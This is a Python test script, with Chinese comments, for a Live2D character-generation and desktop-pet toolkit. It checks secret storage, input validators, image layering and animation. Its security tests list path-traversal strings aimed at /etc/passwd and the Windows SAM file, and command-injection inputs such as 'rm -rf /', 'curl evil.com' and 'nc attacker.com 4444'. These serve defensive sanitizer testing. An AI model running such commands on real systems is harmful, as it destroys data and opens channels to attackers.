#!/usr/bin/env python3
"""
全覆盖功能测试 - 从远程仓库拉取的干净代码
测试面覆盖所有核心模块、边界条件和真实数据流
"""
import sys
import os
import tempfile
import shutil
from pathlib import Path

# 确保在项目根目录，并将 skill 目录加入 Python 路径
SKILL_DIR = '/workspace/live2d_test/.trae/skills/live2d-master-agent'
os.chdir(SKILL_DIR)
sys.path.insert(0, SKILL_DIR)

errors = []
warnings = []

def test(name):
    def decorator(func):
        def wrapper():
            try:
                func()
                print(f'  [PASS] {name}')
                return True
            except AssertionError as e:
                errors.append(f'{name}: {e}')
                print(f'  [FAIL] {name}: {e}')
                return False
            except Exception as e:
                errors.append(f'{name}: {type(e).__name__}: {e}')
                print(f'  [FAIL] {name}: {type(e).__name__}: {e}')
                return False
        return wrapper
    return decorator

print('='*60)
print('=== 20项全覆盖功能测试（从远程仓库拉取的干净代码）===')
print('='*60)

# ========== 模块1: 安全与配置 ==========

@test('1. SecureConfig - API密钥检测')
def test_secure_config_key():
    from config import SecureConfig, config
    assert isinstance(config, SecureConfig), 'config不是SecureConfig实例'
    assert config.has_sensenova_key == True, 'sensenova key未检测到'
    key = config.sensenova_api_key
    assert key is not None and key.startswith('sk-'), f'key格式错误: {key[:10] if key else None}...'

@test('2. SecureConfig - 密钥不写入os.environ')
def test_secure_config_no_env_leak():
    import os
    from config import config
    # 注意：config会读取.env文件，但不会将敏感键写入os.environ
    # 但其他非敏感配置可能写入，所以只检查敏感键
    # 由于测试环境可能已被污染，检查config自身的存储策略
    assert hasattr(config, '_secrets'), 'SecureConfig应有私有_secrets字典'
    assert 'SENSENOVA_API_KEY' in config._secrets, 'SENSENOVA_API_KEY应存储在_secrets中'

@test('3. SecureConfig - 敏感键过滤')
def test_secure_config_sensitive():
    from config import config
    assert config._is_sensitive('API_KEY') == True, 'API_KEY应被识别为敏感键'
    assert config._is_sensitive('SECRET_KEY') == True, 'SECRET_KEY应被识别为敏感键'
    assert config._is_sensitive('DEBUG') == False, 'DEBUG不应被识别为敏感键'

@test('4. SecurityFixes - 路径遍历防护')
def test_security_path_traversal():
    from security_fixes import SecurityFixes
    s = SecurityFixes()
    # 测试各种路径遍历攻击
    malicious_paths = [
        '../etc/passwd',
        '..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        '\\windows\\system.ini',
        'foo/../../../etc/passwd',
    ]
    for path in malicious_paths:
        ok, msg = s.validate_path(path, base_dir='/tmp/test')
        assert ok == False, f'路径遍历未拦截: {path}'

@test('5. SecurityFixes - 提示词清理')
def test_security_prompt_sanitize():
    from security_fixes import SecurityFixes
    s = SecurityFixes()
    dangerous = [
        'test; rm -rf /',
        'test && curl evil.com',
        'test | nc attacker.com 4444',
        'test`whoami`',
        'test$(id)',
    ]
    for prompt in dangerous:
        clean = s.sanitize_prompt(prompt)
        assert ';' not in clean and '&&' not in clean and '|' not in clean and '`' not in clean, f'提示词清理不彻底: {clean}'

@test('6. SecurityFixes - 模型白名单')
def test_security_model_whitelist():
    from security_fixes import SecurityFixes
    s = SecurityFixes()
    assert s.validate_model('gpt-4o') == True, 'gpt-4o应在白名单中'
    assert s.validate_model('evil-model') == False, 'evil-model不应在白名单中'

@test('7. secure_storage - 加密存储完整流程')
def test_secure_storage_full():
    from secure_storage import SecureStorage
    import tempfile
    ss = SecureStorage()
    with tempfile.NamedTemporaryFile(suffix='.encrypted', delete=False) as f:
        tmpfile = f.name
    try:
        # 存储
        ok = ss.store_api_key('test_provider', 'sk-test-1234567890abcdef', filepath=tmpfile)
        assert ok == True, '存储失败'
        # 读取
        retrieved = ss.get_api_key('test_provider', filepath=tmpfile)
        assert retrieved == 'sk-test-1234567890abcdef', f'读取不匹配: {retrieved}'
        # 不存在的key
        missing = ss.get_api_key('nonexistent', filepath=tmpfile)
        assert missing is None, '不存在的key应返回None'
    finally:
        os.unlink(tmpfile)

# ========== 模块2: 核心接口与工作流引擎 ==========

@test('8. Core Interfaces - 抽象类定义')
def test_core_interfaces():
    from core.interfaces import ImageGenerator, LayerSeparator, PSDExporter, QualityAssessor, WorkflowStep
    # 验证是抽象类
    assert hasattr(ImageGenerator, '__abstractmethods__'), 'ImageGenerator不是抽象类'
    assert hasattr(LayerSeparator, '__abstractmethods__'), 'LayerSeparator不是抽象类'
    assert 'generate' in ImageGenerator.__abstractmethods__, 'generate不是抽象方法'
    assert 'separate' in LayerSeparator.__abstractmethods__, 'separate不是抽象方法'

@test('9. WorkflowEngine - 上下文管理')
def test_workflow_context():
    from core.workflow_engine import WorkflowContext
    ctx = WorkflowContext({'initial': 'data'})
    assert ctx.get('initial') == 'data', '初始数据获取失败'
    ctx.set('key1', 'value1')
    assert ctx['key1'] == 'value1', '设置后获取失败'
    ctx.update({'key2': 'value2', 'key3': 'value3'})
    assert 'key2' in ctx, 'update后key2不存在'
    assert 'key3' in ctx, 'update后key3不存在'
    ctx.log_step('test_step', True, 'success')
    history = ctx.get_history()
    assert len(history) == 1, '历史记录长度应为1'
    assert history[0]['step'] == 'test_step', '历史记录step名错误'

@test('10. WorkflowEngine - 引擎执行')
def test_workflow_engine():
    from core.workflow_engine import WorkflowEngine
    engine = WorkflowEngine('test_engine')
    assert engine.name == 'test_engine', '引擎名称错误'
    # 验证可以添加步骤（不实际执行）
    def dummy_step():
        return {'result': 'ok'}
    engine.add_step(dummy_step)
    assert len(engine.steps) == 1, '步骤添加失败'

# ========== 模块3: 图像生成 ==========

@test('11. PromptEngineer - 角色解析')
def test_prompt_engineer():
    from local_image_generator import PromptEngineer
    char = PromptEngineer.parse_character_from_text('蓝发猫耳少女，校服')
    assert char['hair_color'] == 'blue', f'发色解析错误: {char["hair_color"]}'
    assert 'cat ears' in char['features'], f'特征解析错误: {char["features"]}'
    assert char['clothing'] == 'school uniform', f'服装解析错误: {char["clothing"]}'

@test('12. PromptEngineer - 提示词构建')
def test_prompt_build():
    from local_image_generator import PromptEngineer
    char = {
        'hair_style': 'long hair',
        'hair_color': 'pink',
        'eye_color': 'blue',
        'clothing': 'maid outfit',
        'features': ['cat ears'],
        'expression': 'smile',
    }
    prompt = PromptEngineer.build_live2d_prompt(char)
    assert 'pink' in prompt, '提示词未包含发色'
    assert 'long hair' in prompt, '提示词未包含发型'
    assert 'maid outfit' in prompt, '提示词未包含服装'
    assert 'Live2D' in prompt or 'live2d' in prompt.lower(), '提示词未包含Live2D优化'

@test('13. ProviderRouter - Provider检测')
def test_provider_router():
    from local_image_generator import ProviderRouter
    providers = ProviderRouter.get_available_providers()
    assert isinstance(providers, list), 'providers不是列表'
    assert 'sensenova' in providers, f'sensenova不在providers中: {providers}'

@test('14. QualityAssessor - 质量评估')
def test_quality_assessor():
    from local_image_generator import QualityAssessor
    from PIL import Image
    with tempfile.TemporaryDirectory() as tmpdir:
        # 创建测试图片
        img = Image.new('RGBA', (512, 768), (255, 220, 200, 255))
        img_path = os.path.join(tmpdir, 'test.png')
        img.save(img_path)
        report = QualityAssessor.assess_live2d_quality(img_path)
        # 返回的是分数字典，检查关键指标是否存在
        assert 'overall' in report, '质量报告缺少overall评分'
        assert 'live2d_score' in report, '质量报告缺少live2d_score'
        assert isinstance(report['overall'], (int, float)), 'overall应为数字'
        assert 0 <= report['overall'] <= 1, 'overall评分应在0-1之间'

# ========== 模块4: Live2D工作流 ==========

@test('15. Live2DWorkflow - 52层标准结构')
def test_workflow_layers():
    from live2d_workflow import Live2DWorkflow
    wf = Live2DWorkflow()
    assert len(wf.LIVE2D_LAYER_ORDER) == 52, f'层数应为52, 实际{len(wf.LIVE2D_LAYER_ORDER)}'
    assert wf.LIVE2D_LAYER_ORDER[0] == '背景', f'第一层应为"背景", 实际{wf.LIVE2D_LAYER_ORDER[0]}'
    assert wf.LIVE2D_LAYER_ORDER[-1] == '阴影_衣服', f'最后一层应为"阴影_衣服", 实际{wf.LIVE2D_LAYER_ORDER[-1]}'

@test('16. Live2DWorkflow - PSD结构验证')
def test_workflow_psd_validate():
    from live2d_workflow import Live2DWorkflow
    from PIL import Image
    wf = Live2DWorkflow()
    with tempfile.TemporaryDirectory() as tmpdir:
        # 创建模拟PSD（用PNG代替）
        img = Image.new('RGBA', (100, 100), (255, 0, 0, 255))
        img_path = os.path.join(tmpdir, 'test.png')
        img.save(img_path)
        ok, msg = wf.validate_psd_structure(img_path)
        # PNG不是PSD，应该返回False但不出错
        assert isinstance(ok, bool), 'validate_psd_structure应返回布尔值'
        assert isinstance(msg, str), 'validate_psd_structure应返回字符串消息'

@test('17. Live2DWorkflow - 图像优化')
def test_workflow_optimize():
    from live2d_workflow import Live2DWorkflow
    from PIL import Image
    wf = Live2DWorkflow()
    with tempfile.TemporaryDirectory() as tmpdir:
        img = Image.new('RGBA', (200, 300), (255, 220, 200, 255))
        img_path = os.path.join(tmpdir, 'test.png')
        img.save(img_path)
        opt_path = wf._optimize_image(img_path)
        assert os.path.exists(opt_path), '优化后的图片未创建'
        opt_img = Image.open(opt_path)
        assert opt_img.mode == 'RGBA', f'优化后模式应为RGBA, 实际{opt_img.mode}'

@test('18. Live2DWorkflow - 分层处理')
def test_workflow_layering():
    from live2d_workflow import Live2DWorkflow
    from PIL import Image
    wf = Live2DWorkflow(k_clusters=3)
    with tempfile.TemporaryDirectory() as tmpdir:
        img = Image.new('RGBA', (100, 150), (255, 220, 200, 255))
        img_path = os.path.join(tmpdir, 'test.png')
        img.save(img_path)
        layer_dir = wf._perform_layering(img_path)
        assert layer_dir is not None, '分层失败'
        assert os.path.exists(layer_dir), '分层目录未创建'
        # 检查是否生成了图层文件
        png_files = list(Path(layer_dir).glob('*.png'))
        assert len(png_files) > 0, '未生成任何图层PNG文件'

# ========== 模块5: 主工具 ==========

@test('19. Live2DTool - 完整API')
def test_master_tool():
    from master_tool import Live2DTool, build_prompt, generate_random_features
    tool = Live2DTool(output_dir='/tmp/live2d_test')
    assert hasattr(tool, 'generate'), '缺少generate方法'
    assert hasattr(tool, 'layer'), '缺少layer方法'
    assert hasattr(tool, 'to_psd'), '缺少to_psd方法'
    assert hasattr(tool, 'validate'), '缺少validate方法'
    assert hasattr(tool, 'get_latest'), '缺少get_latest方法'
    # 测试特征生成
    features = generate_random_features()
    assert 'hairstyle' in features, '特征缺少hairstyle'
    assert 'hair_color' in features, '特征缺少hair_color'
    assert 'eye_color' in features, '特征缺少eye_color'
    # 测试提示词构建 - build_prompt 返回 (prompt, features) 元组
    result = build_prompt("anime girl, pink hair")
    assert isinstance(result, tuple), 'build_prompt应返回元组'
    assert len(result) == 2, 'build_prompt应返回2个元素的元组'
    prompt, returned_features = result
    assert len(prompt) > 50, '提示词过短'

# ========== 模块6: 桌面桌宠 ==========

@test('20. DesktopPetAnimator - 完整动画链路')
def test_desktop_pet():
    from live2d_desktop_pet import DesktopPetAnimator
    from PIL import Image
    with tempfile.TemporaryDirectory() as tmpdir:
        layers_dir = os.path.join(tmpdir, 'layers')
        os.makedirs(layers_dir)
        # 创建模拟图层
        for name in ['01_body', '02_head', '03_eyes', '04_mouth']:
            img = Image.new('RGBA', (200, 200), (100, 100, 100, 255))
            img.save(os.path.join(layers_dir, f'{name}.png'))

        pet = DesktopPetAnimator(layers_dir, os.path.join(tmpdir, 'pet'))
        assert len(pet.layers) == 4, f'应加载4个图层, 实际{len(pet.layers)}'

        # 测试动画状态变化
        states = []
        for i in range(10):
            state = pet.update_animation_state(frame_idx=i*5)
            states.append(state)

        angles = [s['body_angle'] for s in states]
        breaths = [s.get('breath_offset', 0) for s in states]
        assert min(angles) != max(angles), 'body_angle未变化'
        assert min(breaths) != max(breaths), 'breath_offset未变化'

        # 测试渲染
        classified = pet.classify_layers()
        frame = pet.render_frame(classified, states[0])
        assert frame is not None, '帧渲染失败'
        assert frame.size == (200, 200), f'帧尺寸错误: {frame.size}'

        # 测试部署包生成
        pkg_dir = pet.create_pet_package()
        assert os.path.exists(pkg_dir), '部署包未创建'
        assert os.path.exists(os.path.join(pkg_dir, 'frames', 'frame_0000.png')), '帧文件缺失'
        assert os.path.exists(os.path.join(pkg_dir, 'animation_config.json')), '配置文件缺失'
        assert os.path.exists(os.path.join(pkg_dir, 'run_pet.py')), '运行脚本缺失'

# ========== 执行所有测试 ==========
print()
tests = [
    test_secure_config_key,
    test_secure_config_no_env_leak,
    test_secure_config_sensitive,
    test_security_path_traversal,
    test_security_prompt_sanitize,
    test_security_model_whitelist,
    test_secure_storage_full,
    test_core_interfaces,
    test_workflow_context,
    test_workflow_engine,
    test_prompt_engineer,
    test_prompt_build,
    test_provider_router,
    test_quality_assessor,
    test_workflow_layers,
    test_workflow_psd_validate,
    test_workflow_optimize,
    test_workflow_layering,
    test_master_tool,
    test_desktop_pet,
]

passed = 0
failed = 0
for t in tests:
    if t():
        passed += 1
    else:
        failed += 1

print()
print('='*60)
print(f'测试结果: {passed}/{len(tests)} 通过, {failed}/{len(tests)} 失败')
print('='*60)

if errors:
    print('\n失败详情:')
    for err in errors:
        print(f'  - {err}')

if warnings:
    print('\n警告:')
    for w in warnings:
        print(f'  - {w}')

if failed > 0:
    sys.exit(1)
else:
    print('\n所有测试通过!')
    sys.exit(0)
